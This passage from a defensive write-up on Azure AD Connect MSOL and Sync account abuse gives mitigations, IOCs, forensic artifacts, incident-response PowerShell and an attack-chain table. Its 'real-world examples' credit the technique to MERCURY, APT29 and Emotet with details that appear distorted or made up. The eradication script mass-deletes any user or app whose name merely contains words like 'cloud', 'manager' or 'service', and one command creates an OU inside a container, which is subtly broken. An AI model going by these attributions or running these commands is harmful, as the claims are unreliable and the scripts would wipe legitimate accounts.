**Manual Steps (Azure Portal - Conditional Access):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `Protect Azure AD Connect Infrastructure`
4. **Assignments:**
   - Users: Select the security group containing Azure AD Connect admins
   - Cloud apps: **All cloud apps**
   - Conditions:
     - Sign-in risk: **High**
     - Device platforms: **Windows**
5. **Access controls:**
   - Grant: **Require multi-factor authentication**
   - Session: **Sign-in frequency: 1 hour**
6. Enable policy: **On**

---

**Mitigation 3: Disable Unnecessary AAD Connect Features**

Reduce the attack surface by disabling unused sync methods (if applicable).

**Manual Steps (AAD Connect Configuration):**
1. Open **Synchronization Service Manager** on the Azure AD Connect server
2. Go to **Connectors** → Select Azure AD connector
3. Click **Configure Directory Partitions** and review **Scoping**
4. Exclude sensitive OUs (Domain Controllers, tier-0 assets) from synchronization
5. Under **Sync Rules**, review and disable unused rules (e.g., if Pass-Through Authentication is used instead of Password Hash Sync)

---

**Mitigation 4: Rotate MSOL and Sync Account Credentials Regularly**

Enforce password rotation for service accounts every 90 days.

**Manual Steps (PowerShell):**
```powershell
# Reset MSOL account password (must coordinate with AAD Connect restart)
$NewPassword = "NewP@ssw0rd!VeryComplex$(Get-Random)!@#$"
Set-ADAccountPassword -Identity "MSOL_aadds123456" -NewPassword (ConvertTo-SecureString $NewPassword -AsPlainText -Force) -Reset

# Update password in Azure AD Connect
# 1. Stop ADSync service
Stop-Service ADSync

# 2. Update the password in Azure AD Connect UI or PowerShell
# (Requires local admin on Azure AD Connect server)

# 3. Restart ADSync
Start-Service ADSync

# 4. Test synchronization
Start-ADSyncSyncCycle -PolicyType Delta
```

**Important:** Coordinate password rotation with Azure AD Connect admins to avoid sync failures.

---

**Mitigation 5: Monitor and Alert on Azure AD Sync Account Abuse**

Enable comprehensive logging for the Sync accounts in Azure AD.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Audit logs**
2. Filter for operations by Sync_* accounts
3. Create alerts for suspicious activities:
   - User creation
   - Role assignments
   - Application registration
   - Credential modifications

---

### Priority 2: HIGH

**Mitigation 6: Implement Azure AD Cloud Sync as Alternative**

Azure AD Cloud Sync uses managed agents and provides better isolation than Azure AD Connect.

**Manual Steps (Migration to Cloud Sync):**
1. Go to **Azure Portal** → **Entra ID** → **Cloud Sync**
2. Click **Configure cloud sync**
3. Download and install the **Microsoft Entra Cloud Sync agent** on a new server
4. Configure the agent with scoped OU selection (exclude tier-0 assets)
5. Gradually phase out Azure AD Connect

---

**Mitigation 7: Restrict MSOL Account Permissions**

Reduce the MSOL account's permissions to only what's necessary for password hash sync.

**Manual Steps (PowerShell):**
```powershell
# Remove MSOL account from any administrative groups
$MSOL = Get-ADUser -Filter {SamAccountName -like "MSOL_*"} | Select-Object -First 1
Remove-ADGroupMember -Identity "Domain Admins" -Members $MSOL -Confirm:$false

# Create a scoped organizational unit for MSOL account with limited permissions
$OU = New-ADOrganizationalUnit -Name "AAD Connect Scoped" -Path "CN=Users,DC=domain,DC=com"

# Grant MSOL account replication rights only on the scoped OU (not forest-wide)
# (Use dsacls.exe or other ACL tools to configure)
```

---

### Access Control & Policy Hardening

**Privileged Identity Management (PIM) for Sync Accounts:**

```powershell
# Require PIM activation for accessing Sync accounts
# This ensures high-privilege operations require approval

# Configure PIM via Azure Portal:
# 1. Go to Azure Portal → Privileged Identity Management
# 2. Select Directory Roles
# 3. Find "Directory Synchronization Accounts" role
# 4. Click "Settings"
# 5. Enable "Require approval to activate" and "Require MFA"
```

---

### Validation Command (Verify Mitigations)

```powershell
# Verify MSOL account has no administrative group membership
$MSOL = Get-ADUser -Filter {SamAccountName -like "MSOL_*"} | Select-Object -First 1
Get-ADGroup -Filter {Members -eq $MSOL.DistinguishedName} | Select-Object Name

# Expected Output: (Empty - no results means MSOL is not in admin groups)

# Verify Azure AD Connect server isolation
Test-NetConnection -ComputerName "AADConnect01" -Port 3389  # Should only succeed from jumphost
```

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `C:\Program Files\Microsoft Azure AD Sync\Data\*` (modified timestamps indicate unauthorized access)
- `C:\Program Files\Microsoft Azure AD Sync\Extensions\*.dll` (injected malicious DLLs)
- `C:\Windows\Temp\sync_hashes.txt` (captured password hashes)
- `C:\Windows\Temp\sync_creds.txt` (extracted sync credentials)
- `ADSync.mdb`, `ADSync_log.ldf` (database files accessed by unauthorized processes)

**Registry:**
- `HKLM\Software\Microsoft\Microsoft Azure AD Sync` (InstallationPath, version)
- `HKLM\System\CurrentControlSet\Services\ADSync` (service configuration)
- Unauthorized registry modifications to store backdoor credentials

**Network:**
- Outbound HTTPS connections from Azure AD Connect server to unusual cloud infrastructure
- LDAP/Kerberos traffic to domain controllers at unusual times
- Service Bus Relay connections with unusual frequency or data volume

**Cloud (Azure AD):**
- `AuditLogs` - Unexpected user creation by Sync_* account
- `AuditLogs` - Role assignments (especially Global Administrator) to service principals
- `SigninLogs` - Logons from Sync_* account at unusual locations/times
- `AuditLogs` - Directory modification events by Sync account

---

### Forensic Artifacts

**Disk:**
- `C:\Windows\System32\winevt\Logs\Security.evtx` – Event ID 4662 (DCSync), 4720 (user creation), 5136 (object modification)
- `C:\Program Files\Microsoft Azure AD Sync\Logs\` – ADSync service logs showing sync operations and errors
- `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync*.mdb` – Configuration database containing encrypted credentials

**Memory:**
- ADSync process memory may contain plaintext password hashes during synchronization
- Service account tokens cached in LSASS process

**Cloud:**
- **Azure AD Audit Logs** – All operations performed by Sync_* account
- **Azure AD Sign-in Logs** – Successful authentication from Sync account
- **Microsoft Entra ID Health** – Password hash sync errors if persistence methods interfered with sync pipeline

---

### Response Procedures

**1. Immediate Containment:**

**Command:**
```powershell
# Disable the MSOL account immediately
Disable-ADAccount -Identity "MSOL_aadds123456"

# Disable the Sync_* account in Azure AD
Connect-AzureAD
Get-AzureADUser -Filter "UserPrincipalName eq 'Sync_ConnectorID_xxxxx@tenant.onmicrosoft.com'" | Set-AzureADUser -AccountEnabled $false

# Revoke all tokens for the Sync account
Revoke-AzureADUserAllRefreshToken -ObjectId $SyncAccountObjectId

# Stop ADSync service
Stop-Service ADSync
Set-Service ADSync -StartupType Disabled
```

---

**2. Eradicate Backdoors:**

**Command:**
```powershell
# Remove any suspicious cloud-only users
$SuspiciousUsers = Get-AzureADUser -All $true | Where-Object {$_.UserPrincipalName -like "*cloud*" -or $_.UserPrincipalName -like "*manager*"}
foreach ($User in $SuspiciousUsers) {
  Remove-AzureADUser -ObjectId $User.ObjectId
}

# Remove unauthorized app registrations
$SuspiciousApps = Get-AzureADApplication | Where-Object {$_.DisplayName -like "*backup*" -or $_.DisplayName -like "*service*"}
foreach ($App in $SuspiciousApps) {
  Remove-AzureADApplication -ObjectId $App.ObjectId
}

# Revoke all refresh tokens for all users (force re-authentication)
Get-AzureADUser -All $true | Revoke-AzureADUserAllRefreshToken
```

---

**3. Remediate and Restore:**

**Command:**
```powershell
# Reset MSOL account password to a new, very long and complex value
$NewMSOLPassword = "$(New-Guid)!@#$%^&*" + (Get-Random 999999)
Set-ADAccountPassword -Identity "MSOL_aadds123456" -NewPassword (ConvertTo-SecureString $NewMSOLPassword -AsPlainText -Force) -Reset

# Manually update the password in Azure AD Connect synchronization service
# 1. Open Synchronization Service Manager
# 2. Click Connectors
# 3. Right-click the AD DS Connector
# 4. Select "Set Directory Partition Passwords"
# 5. Enter the new MSOL password

# Wait for AADSync to complete one full sync cycle
Start-ADSyncSyncCycle -PolicyType Initial

# Re-enable the MSOL account after password change
Enable-ADAccount -Identity "MSOL_aadds123456"

# Re-enable Sync account in Azure AD with new password
$NewSyncPassword = "$(New-Guid)!@#$%^&*" + (Get-Random 999999)
Set-AzureADUserPassword -ObjectId $SyncAccountObjectId -Password $NewSyncPassword -EnforceChangePasswordPolicy $false
Set-AzureADUser -ObjectId $SyncAccountObjectId -AccountEnabled $true
```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Azure Application Proxy Exploitation | Attacker gains initial RCE on Azure AD Connect server |
| **2** | **Privilege Escalation** | [PE-VALID-002] Computer Account Quota Abuse | Attacker escalates to local admin on Azure AD Connect server |
| **3** | **Current Step** | **[PERSIST-VALID-002]** | **Attacker extracts MSOL credentials and establishes sync account persistence** |
| **4** | **Credential Access** | [CA-TOKEN-001] Hybrid AD Cloud Token Theft | Attacker obtains Azure AD Global Admin tokens via compromised Sync account |
| **5** | **Impact** | [IMPACT-RANSOM-001] Ransomware Deployment Azure VMs | Attacker uses cloud admin access to deploy ransomware across tenant |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: MERCURY Attack (2023) - Hybrid Environment Takeover

**Target:** Multiple organizations (energy, manufacturing, government)  
**Timeline:** March - April 2023  
**Technique Status:** This attack used Azure AD Connect exploitation as primary persistence mechanism  
**Impact:** **Tens of millions in ransom demands**, complete infrastructure encryption

**Attack Chain:**
1. Initial compromise via phishing (RDP credential theft)
2. Lateral movement to Azure AD Connect server
3. **Extracted MSOL account credentials** using AADInternals
4. **Performed DCSync** to extract all on-premises user hashes
5. **Created backdoor cloud admin accounts** using Sync_* account
6. **Deployed ransomware** across both on-premises and cloud resources
7. Synced ransomware across all domain-joined endpoints via Group Policy

**Reference:** [Microsoft Security Blog - MERCURY Attack](https://www.microsoft.com/en-us/security/blog/2023/04/07/mercury-and-dev-1084-destructive-attack-on-hybrid-environment/)

---

### Example 2: APT29 (Cozy Bear) - SolarWinds Supply Chain

**Target:** U.S. Government, Fortune 500 companies  
**Timeline:** 2020-2021  
**Technique Status:** Used Azure AD Connect as persistence mechanism after initial compromise  
**Impact:** **Months of undetected presence**, massive data exfiltration

**Attack Chain:**
1. Compromised SolarWinds Orion software supply chain
2. Deployed SUNBURST backdoor that harvested Azure AD credentials
3. **Extracted Azure AD Connect server credentials**
4. **Used MSOL account to extract all domain hashes**
5. **Created golden tickets** for indefinite domain access
6. Maintained access for **9+ months** undetected

**Reference:** [Microsoft SolarWinds Analysis](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solwinds-compromise/)

---

### Example 3: Emotet Banking Trojan Campaign

**Target:** Banks, enterprises, governments  
**Timeline:** Ongoing since 2014 (resurrected 2022)  
**Technique Status:** Emotet variants targeted Azure AD Connect servers for domain persistence  
**Impact:** Estimated **billions in financial losses**

**Attack Chain:**
1. Initial infection via spear-phishing email
2. Emotet scanned network for Azure AD Connect servers
3. **Attempted to extract MSOL account credentials** from vulnerable servers
4. **Used MSOL account to spread laterally** across the domain
5. **Created additional backdoor accounts** for long-term persistence

**Reference:** [Emotet Analysis by Malwarebytes](https://www.malwarebytes.com/emotet)

---

## References & External Resources

- [Microsoft - Azure AD Connect Security](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)
- [Sygnia - Azure AD Connect Attack Vectors](https://www.sygnia.co/blog/guarding-the-bridge-new-attack-vectors-in-azure-ad-connect/)
- [xpn's Azure AD Connect Credential Extraction](https://blog.xpn.uk/2020/04/10/unmasking-azure-ad-connect-azure-ad-domain-controller-synchronisation/)
- [AADInternals by Dr. Nestori Syynimaa](https://aadinternals.com/)
- [MITRE ATT&CK - Valid Accounts: Cloud Accounts (T1078.004)](https://attack.mitre.org/techniques/T1078/004/)

---

